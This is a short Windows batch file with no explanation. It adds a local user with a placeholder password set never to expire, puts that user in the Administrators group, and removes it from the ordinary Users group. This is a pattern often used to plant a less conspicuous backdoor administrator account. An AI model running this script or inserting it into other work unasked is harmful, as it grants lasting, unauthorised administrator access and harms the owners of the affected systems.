@echo off
net user username password /add /expires:never
net localgroup "Administrators" /add username
net localgroup "Users" /del username